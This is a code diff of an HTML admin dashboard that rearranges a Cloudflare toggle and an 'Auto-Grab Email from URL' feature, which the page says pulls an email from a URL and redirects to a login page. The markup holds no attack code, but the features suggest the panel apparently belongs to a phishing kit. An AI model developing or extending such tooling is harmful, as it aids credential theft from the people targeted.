@@ -575,19 +575,20 @@
                 </div>
             </div>
 
-            <!-- Cloudflare Enable/Disable Toggle -->
-            <div class="form-group" style="margin-bottom: 24px;">
-                <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 10px 0;">Cloudflare Integration</h3>
-                <div style="display: flex; gap: 12px; align-items: center;">
-                    <button onclick="toggleCloudflare()" id="cf-toggle-btn" class="btn" disabled>
-                        Enable Cloudflare
-                    </button>
-                    <span id="cf-toggle-status" style="color: #94a3b8; font-size: 14px;">Configure Cloudflare first</span>
-                </div>
-            </div>
-
+         
             <!-- Cloudflare Tab -->
             <div id="cloudflare-tab" class="tab-content">
+                <!-- Cloudflare Enable/Disable Toggle -->
+                <div class="form-group" style="margin-bottom: 24px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 10px 0;">Cloudflare Integration</h3>
+                    <div style="display: flex; gap: 12px; align-items: center;">
+                        <button onclick="toggleCloudflare()" id="cf-toggle-btn" class="btn" disabled>
+                            Enable Cloudflare
+                        </button>
+                        <span id="cf-toggle-status" style="color: #94a3b8; font-size: 14px;">Configure Cloudflare first</span>
+                    </div>
+                </div>
+
                 <h2 class="section-title">Cloudflare Configuration</h2>
                 <div class="form-row">
                     <div class="form-group">
@@ -815,6 +816,22 @@
 
             <!-- Auto-Grab Tab -->
             <div id="autograb-tab" class="tab-content">
+
+                <div class="form-group">
+                    <label class="form-label">Auto-Grab Email from URL:</label>
+                    <div style="display: flex; gap: 12px; align-items: center;">
+                        <button onclick="toggleAutoGrab()" id="autograb-toggle-btn" class="btn">
+                            Enable Auto-Grab
+                        </button>
+                        <span id="autograb-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently disabled</span>
+                    </div>
+                    <p style="font-size: 13px; color: #94a3b8; margin-top: 8px;">
+                        When enabled, automatically extracts email from URL and redirects to login page.
+                    </p>
+                </div>
+
+
+                
                 <h2 class="section-title">Auto-Grab URL Parser</h2>
 
                 <div class="dashboard-grid" style="margin-bottom: 20px;">
@@ -836,30 +853,10 @@
 
                     <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">URL Parser Settings</h3>
 
-                    <div class="form-group">
-                        <label class="form-label">Auto-Grab Email from URL:</label>
-                        <div style="display: flex; gap: 12px; align-items: center;">
-                            <button onclick="toggleAutoGrab()" id="autograb-toggle-btn" class="btn">
-                                Enable Auto-Grab
-                            </button>
-                            <span id="autograb-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently disabled</span>
-                        </div>
-                        <p style="font-size: 13px; color: #94a3b8; margin-top: 8px;">
-                            When enabled, automatically extracts email from URL and redirects to login page.
-                        </p>
-                    </div>
+                 
+                    
 
-                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Test URL Parser</h3>
-
-                    <div class="form-group">
-                        <label class="form-label">Enter URL to Parse:</label>
-                        <input type="url" id="autograb-url-input" class="form-input" placeholder="https://example.com/?t=email@example.com">
-                    </div>
-
-                    <div style="display: flex; gap: 12px; margin-bottom: 16px;">
-                        <button onclick="testAutoGrabUrl()" class="btn btn-success">Parse URL</button>
-                        <button onclick="clearAutoGrabTest()" class="btn btn-secondary">Clear</button>
-                    </div>
+                
 
                     <div id="autograb-result" style="display: none; background: #0f172a; border: 1px solid #475569; padding: 16px; border-radius: 6px;">
                         <h4 style="color: #22c55e; font-size: 14px; margin: 0 0 12px 0;">✅ Parsing Result</h4>
